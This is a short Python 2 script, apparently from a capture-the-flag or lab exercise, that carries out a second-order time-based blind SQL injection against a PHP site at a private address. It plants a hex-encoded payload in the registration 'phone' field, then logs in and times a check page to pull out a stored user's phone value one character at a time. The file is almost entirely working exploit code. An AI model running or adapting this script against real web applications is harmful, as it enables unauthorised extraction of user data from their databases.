#coding:utf-8
import requests
import random
import string



# print hex_s

# database="webdb"
database=""
#pass c199055fc2c7a66eb257dd3c865398
strstr="-\{0123456789abcdefghijklmnopqrstuvwxyz\}"
for x in range(20,50):
    for z in strstr:
        reg_url="http://172.16.5.105/register.php"
        username='mmp'+str(random.randint(9999, 10000000))
        sqlstr="1 and(if((ascii(substring((select phone from user limit 0,1),%s,1))=%s),sleep(3),1))" %(x,ord(z))
        #sqlstr="1 and(if((ascii(substring(database(),%s,1))=%s),sleep(3),0))" %(x,z)
        # print sqlstr
        hex_s=""
        for i in sqlstr:
            hex_s=hex_s+hex(ord(i)).replace('0x','')
        r_data={
        "username":username,
        "password":"123",
        "phone":"0x"+hex_s
        }
        res=requests.post(reg_url, data=r_data,timeout=20)
        # print username
        # print res.content

        #先注册


        log_url="http://172.16.5.105/login.php"
        log_data={
            "username":username,
            "password":"123"
        }
        S=requests.session()
        l_res=S.post(log_url, data=log_data,timeout=20)

        index_url="http://172.16.5.105/index.php"
        index_res=S.get(index_url)
        # print index_res.content
        check_url="http://172.16.5.105/check.php"
        try:
            check_res=S.get(check_url,timeout=3)
        except Exception, e:
            # print sqlstr
            database=database+z
            print database

